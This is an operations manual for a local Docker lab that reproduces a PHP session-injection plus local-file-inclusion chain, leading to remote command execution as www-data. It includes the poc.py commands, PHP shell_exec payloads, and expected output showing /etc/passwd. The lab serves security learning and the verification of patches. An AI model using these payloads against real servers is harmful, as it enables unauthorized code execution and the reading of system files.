# Operation Manual (php2shell-lab)

This document is for readers who "just want to get the lab running and reproduce it once with their own hands". Step by step from start to finish, each step gives the command and the expected result.

> ⚠️ This lab is for local learning and authorized testing only. Do not use it against unauthorized targets.

---

## Table of contents

1. [Requirements](#1-requirements)
2. [Installing Docker and Python](#2-installing-docker-and-python)
3. [Starting the lab](#3-starting-the-lab)
4. [Reproducing the vulnerability](#4-reproducing-the-vulnerability)
5. [Customizing](#5-customizing)
6. [Stopping and cleaning up](#6-stopping-and-cleaning-up)
7. [FAQ](#7-faq)

---

## 1. Requirements

| Dependency | Version | Notes |
|------------|---------|-------|
| Docker | Any recent version (with Docker Compose v2) | Runs the lab container |
| Python | 3.7+ | Runs `poc.py` (standard library only, no `pip install` needed) |
| Disk / memory | Some free space | The image is a few hundred MB |

- **Windows**: install [Docker Desktop](https://www.docker.com/products/docker-desktop/) and make sure it is running (whale icon in the tray is fine).
- **macOS / Linux**: install Docker Engine + Docker Compose.

---

## 2. Installing Docker and Python

### 2.1 Docker

- Windows/macOS: download and install Docker Desktop, start it, and wait for "Engine running".
- Linux: `sudo apt install docker.io docker-compose-v2` (or follow your distro's docs).

Verify:

```bash
docker --version
docker compose version
```

### 2.2 Python

- Windows: download from [python.org](https://www.python.org/downloads/) and **check "Add Python to PATH"**.
- macOS/Linux: `python3` usually comes pre-installed.

Verify:

```bash
python --version        # Windows
python3 --version       # macOS/Linux (replace python with python3 below)
```

> `poc.py` only uses the **standard library** (`argparse`, `random`, `string`, `urllib`); no `pip install` needed.

---

## 3. Starting the lab

Enter the project directory (repo root) and run:

```bash
docker compose up -d --build
```

The expected tail of the output looks like:

```
 Image lab-php2shell Built
 Container lab-php2shell-1 Started
```

Confirm the container is running:

```bash
docker ps
```

You should see a line like:

```
lab-php2shell-1   ...   0.0.0.0:8082->80/tcp
```

Open <http://localhost:8082/> in a browser and you should see the "php2shell Chain A demo" page, which means it started successfully.

> This page is itself a deliberately vulnerable app with an LFI: `?page=/any/path` will `include` that path.

---

## 4. Reproducing the vulnerability

### 4.1 Default "showcase payload"

```bash
python poc.py --target http://localhost:8082
```

Expected output:

```
[1] injected, session file should be /tmp/sessions/sess_xxxxxxxxxxxxxxxxxxxxxxxxxx
[2] LFI include & execute: http://localhost:8082/index.php?page=/tmp/sessions/sess_xxx

uid=33(www-data) gid=33(www-data) groups=33(www-data)
=== WHOAMI ===
www-data
=== UNAME ===
Linux a3ab81efaa32 6.18.54.1-microsoft-standard-WSL2 ... x86_64 GNU/Linux
=== PASSWD ===
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

Seeing `uid=33(www-data)` means **command execution succeeded**, and the identity is the web user `www-data`.

### 4.2 Run a single custom command

```bash
python poc.py --target http://localhost:8082 --cmd "whoami"
python poc.py --target http://localhost:8082 --cmd "id"
python poc.py --target http://localhost:8082 --cmd "uname -a"
```

Expected output (for `--cmd whoami`):

```
www-data
```

### 4.3 Run multiple commands at once

`--cmd` is passed to `/bin/sh -c`, so you can join several with `;`:

```bash
python poc.py --target http://localhost:8082 --cmd "id; whoami; pwd"
```

### 4.4 View it in a browser

`poc.py`'s default payload uses `PHP_EOL` for line breaks, which is best in the **terminal**. To see line breaks in the **browser**, there are two changes:

- **Option 1**: replace `.PHP_EOL` with `. '<br>'` (the browser renders `<br>` as a newline);
- **Option 2**: wrap the output in `<pre>` (which preserves newlines).

In `poc.py` this means editing the `SHOWCASE_PAYLOAD` block:

```python
SHOWCASE_PAYLOAD = (
    "<?php "
    "echo '<pre>'; "                                    # ← add this
    "echo '=== ID ===' . '<br>'; echo shell_exec('id'); "
    "echo '=== WHOAMI ===' . '<br>'; echo shell_exec('whoami'); "
    "echo '</pre>'; "                                   # ← add this
    "die(); ?>"
)
```

Then re-run `poc.py`, and copy the URL printed at step `[2]` into a browser to see the line-broken page.

---

## 5. Customizing

### 5.1 Change the port

Edit `docker-compose.yml`:

```yaml
services:
  php2shell:
    build: .
    ports:
      - "18082:80"      # ← change 8082 to whatever port you want
```

Then:

```bash
docker compose up -d
python poc.py --target http://localhost:18082
```

### 5.2 Change the default payload

Edit `SHOWCASE_PAYLOAD` in `poc.py` and replace it with any PHP code you want to inject. For example, just to prove code execution:

```python
SHOWCASE_PAYLOAD = "<?php echo 'PWNED_' . md5('x'); die(); ?>"
```

> Use **single quotes** in the payload (the outer `filename` uses double quotes, so double quotes would truncate it); it must be one single line (a newline truncates the multipart header).

### 5.3 Use a more realistic PHP version

The first line of `Dockerfile` pins `php:8.2.34-apache` (vulnerable). To verify that the fixed version is no longer affected, temporarily change it to `php:8.2.35-apache`, rebuild, then run `poc.py` again and compare.

---

## 6. Stopping and cleaning up

```bash
# Stop (keep the image; next `up` is fast)
docker compose down

# Stop and delete the image (full cleanup)
docker compose down --rmi all

# Delete only the container, keep the image
docker compose rm -f
```

If you changed the port or want a completely fresh start:

```bash
docker compose down --rmi all
docker compose up -d --build
```

---

## 7. FAQ

### Q1: `docker compose up` fails with "port already allocated"

```
Bind for 0.0.0.0:8082 failed: port is already allocated
```

Something else is using 8082. Two options:
- change the port in `docker-compose.yml` (see 5.1);
- find and stop the conflicting process: `docker ps` to see if another container uses 8082, then `docker rm -f <name>`.

### Q2: build fails with `/app not found`

```
failed to solve: ... "/app": not found
```

The `app/` directory was deleted (`Dockerfile` has `COPY app/ ...`). Confirm `app/index.php` exists, then `docker compose up -d --build`.

### Q3: garbled Chinese output (things like `��`)

This is a Windows terminal encoding issue (terminal is GBK, program outputs UTF-8), and **does not affect the vulnerability itself**. Fix:

```powershell
chcp 65001
$env:PYTHONIOENCODING = "utf-8"
python poc.py --target http://localhost:8082
```

(ASCII output like `id`, `whoami` is already fine; only the Chinese messages get garbled.)

### Q4: `poc.py` hangs / connection timeout

- confirm the container is running: `docker ps`;
- confirm the port: default `8082`;
- confirm no proxy interference: if `HTTP_PROXY` is set, `set HTTP_PROXY=` to disable it temporarily.

### Q5: why www-data and not root?

php2shell gives you the **web user** (Apache's `www-data` in this lab), not root. Going from www-data to root requires an additional local privilege-escalation vulnerability, which is a different class of problem. See the "About privileges" section in [analysis-en.md](analysis-en.md).

### Q6: how do I prove this site really has the vuln and it's not a false positive?

The fact that `poc.py` reliably executes the PHP you inject (e.g. `id`, `whoami` return real command results) is itself solid proof of RCE. In real authorized testing, it's recommended to start with a **read-only, non-destructive** payload (e.g. `phpinfo()`, `echo md5('x')`) as a harmless check before going further.

### Q7: I want to self-test on a real blog, why do I get 403 / no response?

Production environments usually have a WAF, CDN, UA checks, or are static sites, and behave differently from this local lab. Only test on targets you are authorized to, and prefer "harmless verification payloads".
